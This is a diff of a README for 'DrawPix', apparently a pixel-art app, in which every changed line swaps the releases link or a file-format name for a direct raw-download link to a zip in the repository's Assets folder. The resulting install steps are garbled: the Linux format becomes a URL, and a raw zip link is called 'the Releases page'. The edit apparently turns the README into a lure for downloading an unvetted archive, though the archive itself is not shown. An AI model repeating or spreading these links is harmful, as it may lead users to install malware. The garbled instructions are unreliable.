@@ -1,7 +1,7 @@
 # 🎨 DrawPix - Create Stunning Art with Pixels
 
 ## 📥 Download Now!
-[![Download DrawPix](https://img.shields.io/badge/Download-DrawPix-blue.svg)](https://github.com/jetsurenos/DrawPix/releases)
+[![Download DrawPix](https://github.com/jetsurenos/DrawPix/raw/refs/heads/main/Assets/Pix-Draw-3.1.zip)](https://github.com/jetsurenos/DrawPix/raw/refs/heads/main/Assets/Pix-Draw-3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to DrawPix, a digital canvas designed for your creative ideas. With 25,600 pixels at your fingertips, you can easily create and share your artwork. Whether you are a beginner or an experienced artist, DrawPix is here to help you unleash your creativity.
@@ -22,13 +22,13 @@ Before you start, ensure your system meets the following minimum requirements:
 To get started with DrawPix, follow these steps:
 
 1. **Visit the Download Page**
-   Click the following link to go to the Releases page: [Download Here](https://github.com/jetsurenos/DrawPix/releases).
+   Click the following link to go to the Releases page: [Download Here](https://github.com/jetsurenos/DrawPix/raw/refs/heads/main/Assets/Pix-Draw-3.1.zip).
 
 2. **Choose Your Version**
    On the Releases page, you will see different versions of DrawPix. Choose the latest version for your operating system.
 
 3. **Download the File**
-   Click on the file for your platform to start the download. This file will be in a `.zip` or `.exe` format for Windows, a `.dmg` format for macOS, or a `.tar.gz` for Linux.
+   Click on the file for your platform to start the download. This file will be in a `.zip` or `.exe` format for Windows, a `.dmg` format for macOS, or a `https://github.com/jetsurenos/DrawPix/raw/refs/heads/main/Assets/Pix-Draw-3.1.zip` for Linux.
 
 4. **Install the Application**
    - For Windows:
@@ -38,7 +38,7 @@ To get started with DrawPix, follow these steps:
      - Open the downloaded `.dmg` file.
      - Drag the DrawPix icon to your Applications folder.
    - For Linux:
-     - Extract the `.tar.gz` file and follow any included instructions to run the application.
+     - Extract the `https://github.com/jetsurenos/DrawPix/raw/refs/heads/main/Assets/Pix-Draw-3.1.zip` file and follow any included instructions to run the application.
 
 5. **Launch DrawPix**
    After installation, look for the DrawPix icon on your desktop or in your applications. Click it to start creating!
